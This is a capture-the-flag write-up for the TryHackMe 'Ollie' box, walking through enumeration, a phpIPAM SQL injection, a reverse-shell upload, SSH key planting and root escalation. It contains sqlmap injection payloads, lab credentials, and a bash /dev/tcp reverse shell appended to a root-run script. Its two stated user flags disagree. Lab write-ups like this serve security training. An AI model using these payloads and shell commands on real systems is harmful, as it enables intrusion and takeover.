# TryHackMe - Ollie

## 📌 Task 1: Roof Roof

### 🛠 Reco

Set an environment variable for the IP to simplify commands:

```bash
export IP=10.10.55.216
```

### 🔍 Nmap Scan

```bash
nmap -sC -sV -oN nmap/initial $IP
```

**Results:**

```
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.13 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 65:d6:f7:e4:5e:4b:80:2c:8c:27:21:a1:a8:f0:ea:54 (RSA)
|   256 0f:58:f3:7e:4d:6b:3d:76:53:17:c3:22:27:b9:01:f8 (ECDSA)     
|_  256 61:92:ba:99:ba:c8:7f:1b:4d:98:cf:e4:22:d7:6a:74 (ED25519)   
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))                 
| http-robots.txt: 2 disallowed entries                             
|_/ /immaolllieeboyyy                                               
|_http-server-header: Apache/2.4.41 (Ubuntu)                        
| http-title: Ollie :: login                                        
|_Requested resource was http://10.10.55.216/index.php?page=login   
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

### 🔍 Gobuster

```bash
gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -u http://10.10.55.216 -x .php,.txt,.html | tee bob_scan
```

**Results:**
```
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.php                 (Status: 403) [Size: 277]
/.html                (Status: 403) [Size: 277]
/index.php            (Status: 302) [Size: 0] [--> http://10.10.55.216/index.php?page=login]
/misc                 (Status: 301) [Size: 311] [--> http://10.10.55.216/misc/]
/css                  (Status: 301) [Size: 310] [--> http://10.10.55.216/css/]
/imgs                 (Status: 301) [Size: 311] [--> http://10.10.55.216/imgs/]
/install              (Status: 301) [Size: 314] [--> http://10.10.55.216/install/]
/db                   (Status: 301) [Size: 309] [--> http://10.10.55.216/db/]
/app                  (Status: 301) [Size: 310] [--> http://10.10.55.216/app/]
/js                   (Status: 301) [Size: 309] [--> http://10.10.55.216/js/]
/api                  (Status: 301) [Size: 310] [--> http://10.10.55.216/api/]
/upgrade              (Status: 301) [Size: 314] [--> http://10.10.55.216/upgrade/]
/javascript           (Status: 301) [Size: 317] [--> http://10.10.55.216/javascript/]
/config.php           (Status: 200) [Size: 0]
/robots.txt           (Status: 200) [Size: 54]
/INSTALL.txt          (Status: 200) [Size: 111]
/functions            (Status: 301) [Size: 316] [--> http://10.10.55.216/functions/]
/.html                (Status: 403) [Size: 277]
/.php                 (Status: 403) [Size: 277]
```

### Initial foothold

While I was waiting. I had a look at robots.txt. There is an entry in their and it points to a hidden subdirectoy "/immaolllieeboyyy". That forwards to a youtube vide for islandboy. LOL. That made me laugh!

I did note on the main page that it's running "phpIPAM IP address management [v1.4.5]". A quick google returned RCE expoits for this version - https://www.exploit-db.com/exploits/50963 but I need an admin account first!

There is a couple of options here. I could try and use SQLInjection on the page to see what happens (least probable) or I can use hydra and bash the site (fun option)! I'll run both and see which one hits

### 🔍 SQLMap
```bash
sqlmap http://10.10.55.216/index.php?page=login --forms --level=5
```
**Results:**
```
failed!
```

### 🔍 Hydra
First I jump into burpsuite and grab the HTML Post

**Results:**
```
ipamusername=username&ipampassword=password
```

```bash
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.10.55.216 http-form-post "/app/login/login_check.php:ipamusername=^USER^&ipampassword=^PASS^:Invalid username or password"
```

**Results:**
```
You have been blocked for 5 minutes due to authentication failures
Dam it has a checker on it!
```

### Where next?

The nmap full portscan finished. 
```
nmap -p- nmap/full_scan $IP 
```

**Results:**
```
PORT     STATE SERVICE                                                                                              
22/tcp   open  ssh                                                                                                  
80/tcp   open  http                                                                                                 
1337/tcp open  waste   
```
We have another port : 1337
```bash
nc $IP 1337
```

**Results:**
```
Hey stranger, I'm Ollie, protector of panels, lover of deer antlers.

What is your name? admin
What's up, Admin! It's been a while. What are you here for? password
Ya' know what? Admin. If you can answer a question about me, I might have something for you.
What breed of dog am I? I'll make it a multiple choice question to keep it easy: Bulldog, Husky, Duck or Wolf? Bulldog
You are correct! Let me confer with my trusted colleagues; Benny, Baxter and Connie...
Please hold on a minute
Ok, I'm back.
After a lengthy discussion, we've come to the conclusion that you are the right person for the job.Here are the credentials for our administration panel.

                    Username: admin

                    Password: OllieUnixMontgomery!

PS: Good luck and next time bring some treats!
```

All that effort and I just needed to wait for the port scan to finish! Hydra would have never found that password anyway! Back to those vulnerabilities in this version. Now we have a username and password!

### Exploit-db

There are a few on exploit DB for this version as previously mentioned. I tried them but they all failed! 

There is this article that helped me test the process manually and it worked! So the vulnerability works but the scripts don't. I had a quick look but couldn't see anything wrong. 
```
https://fluidattacks.com/advisories/mercury
```

### 🔍 Back to SQLMap

I used burpquite to capture the request using the information above. So that I can pipe it into SQLMap. We're going to need the cookie so we can be authenticated and we need the posted data.

```bash
sqlmap http://10.10.55.216/app/admin/routing/edit-bgp-mapping-search.php --cookie=1p5b77e1apife9e39m7gn6acrq --method=POST --data="subnet=union+select(select+concat(%40%3A%3D0x3a%2C(select%2Bcount(*)+from(users)where(%40%3A%3Dconcat(%40%2Cemail%2C0x3a%2Cpassword%2C%220x3a%22%2C2fa)))%2C%40))%2C2%2C3%2Cuser()+--+-&bgp_id=2"  
```
**Results:**
```
custom injection marker ('*') found in POST body. Do you want to process it? [Y/n/q] y
[13:34:25] [INFO] resuming back-end DBMS 'mysql' 
[13:34:25] [INFO] testing connection to the target URL
sqlmap resumed the following injection point(s) from stored session:

Parameter: #1* ((custom) POST)
    Type: boolean-based blind
    Title: OR boolean-based blind - WHERE or HAVING clause (NOT - MySQL comment)
    Payload: subnet=union select(select concat(@:=0x3a,(select+count(" OR NOT 5395=5395#) from(users)where(@:=concat(@,email,0x3a,password,"0x3a",2fa))),@)),2,3,user() -- -&bgp_id=2

    Type: error-based
    Title: MySQL >= 5.6 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (GTID_SUBSET)
    Payload: subnet=union select(select concat(@:=0x3a,(select+count(" AND GTID_SUBSET(CONCAT(0x7178707871,(SELECT (ELT(4522=4522,1))),0x716a7a6271),4522)-- vHFr) from(users)where(@:=concat(@,email,0x3a,password,"0x3a",2fa))),@)),2,3,user() -- -&bgp_id=2

    Type: stacked queries
    Title: MySQL >= 5.0.12 stacked queries (comment)
    Payload: subnet=union select(select concat(@:=0x3a,(select+count(";SELECT SLEEP(5)#) from(users)where(@:=concat(@,email,0x3a,password,"0x3a",2fa))),@)),2,3,user() -- -&bgp_id=2

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: subnet=union select(select concat(@:=0x3a,(select+count(" AND (SELECT 2780 FROM (SELECT(SLEEP(5)))HmMK)-- uuRL) from(users)where(@:=concat(@,email,0x3a,password,"0x3a",2fa))),@)),2,3,user() -- -&bgp_id=2

    Type: UNION query
    Title: MySQL UNION query (NULL) - 1 column
    Payload: subnet=union select(select concat(@:=0x3a,(select+count(" UNION ALL SELECT NULL,NULL,CONCAT(0x7178707871,0x48776a7368716a75736a6e736c797a4f4846686d736d5554564a657353496548514b445276595445,0x716a7a6271),NULL#) from(users)where(@:=concat(@,email,0x3a,password,"0x3a",2fa))),@)),2,3,user() -- -&bgp_id=2
[13:34:26] [INFO] the back-end DBMS is MySQL
web server operating system: Linux Ubuntu 19.10 or 20.04 or 20.10 (focal or eoan)
web application technology: Apache 2.4.41
back-end DBMS: MySQL >= 5.6
[13:34:26] [INFO] fetched data logged to text files under '/home/pointnext/.local/share/sqlmap/output/10.10.55.216'
```

OK. So that worked. Now we just need to inject our reverse shell. I used the standard pentest monkey php file for this. Updating attacker IP and port accordingly.
```bash
sqlmap -r req.txt -dbs --file-dest=/var/www/html/rev_shell.php --file-write=./rev_shell.php
```
Setup a nc listener
```bash
rlwrap nc -nlvp 9090
```

Run the script in the web browser!

### We're in!

Stablise the shell. 
```bash
python -c 'import pty; pty.spawn("/bin/bash")'
```

let's have a look at /etc/passwd

**Results:**
```
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:100:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
systemd-timesync:x:102:104:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
messagebus:x:103:106::/nonexistent:/usr/sbin/nologin
syslog:x:104:110::/home/syslog:/usr/sbin/nologin
_apt:x:105:65534::/nonexistent:/usr/sbin/nologin
tss:x:106:111:TPM software stack,,,:/var/lib/tpm:/bin/false
uuidd:x:107:112::/run/uuidd:/usr/sbin/nologin
tcpdump:x:108:113::/nonexistent:/usr/sbin/nologin
landscape:x:109:115::/var/lib/landscape:/usr/sbin/nologin
pollinate:x:110:1::/var/cache/pollinate:/bin/false
usbmux:x:111:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin
sshd:x:112:65534::/run/sshd:/usr/sbin/nologin
systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
ollie:x:1000:1000:ollie unix montgomery:/home/ollie:/bin/bash
lxd:x:998:100::/var/snap/lxd/common/lxd:/bin/false
mysql:x:113:118:MySQL Server,,,:/nonexistent:/bin/false
dnsmasq:x:114:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin
fwupd-refresh:x:115:120:fwupd-refresh user,,,:/run/systemd:/usr/sbin/nologin
ubuntu:x:1001:1002:Ubuntu:/home/ubuntu:/bin/bash
```

So it's just root, ollie and ubuntu.

I found the flag in Ollie's home directory but I cannot access as www-data

Interestingly in the passwd file it has "ollie unix montgomery". I wonder if it's the same password as the web
```bash
su ollie
<OllieUnixMontgomery!>
```

Yes! We're now Ollie. Let's get that first flag!

```bash
cat /home/ollie/user.txt
THM{Ollie_boi_is_daH_Cut3st}
```
**Q. What is the user.txt flag?
A. flag{14370304172628f784d8e8962d54a600}

I wonder if we can ssh in? Nope, it's says public key needed. However we can create our own ssh keys. Thank you John Hammond for showing me how!

Go to ollie's home drive (/home/ollie)

```bash
mkdir .ssh
cd .ssh
ssh-keygen
cat id_rsa > authorized_keys

cat id_rsa
```
Copy the private key into clipboard and paste into a new file on your attacker machine called rsa-id. Chmod 600 so that you have perms to use it. Then let's SSH in!
```bash
ssh -i id_rsa ollie@10.10.55.216
```
yes, we are now ssh'd in! 

How about we run linpeas.sh. First grab the file with a python http server and then chmod to execute

**Results:**
```
Vulnerable to CVE-2021-3560
```

I downloaded the vulnerability and ran it. Nope. it just hung. I'm not having much luck with this box!

### Look from crontabs

Next I'll download pspy32 and see if anything pops up. I used the same process of creating a http.server and pulling the file. chmod +x

**Results:**
```
2025/07/07 23:13:49 CMD: UID=0     PID=1      | /sbin/init auto automatic-ubiquity noprompt 
2025/07/07 23:14:00 CMD: UID=0     PID=156386 | (feedme) 
2025/07/07 23:14:34 CMD: UID=0     PID=156387 | /usr/bin/amazon-ssm-agent 
```

Feedme? That looks interesting. Where is it?

```bash
find / -type f -name *feedme* 2>/dev/null

/usr/bin/feedme
/etc/systemd/system/feedme.timer
/etc/systemd/system/feedme.service

cat /usr/bin/feedme
```
**Results:**
```
#!/bin/bash

# This is weird?
```

Ok. That looks like our plan. Let's just add a reverse shell. but first lets setup a reverse shell with nc -nlvp 9999 on our attacker box


```bash
echo "bash -i >& /dev/tcp/10.6.57.243/9999 0>&1" >> feedme
```

waiting, waiting. We're root!

```bash
cat /root/root.txt
THM{Ollie_Luvs_Chicken_Fries}
```

**Q. What is the root.txt flag?
A. THM{Ollie_Luvs_Chicken_Fries}
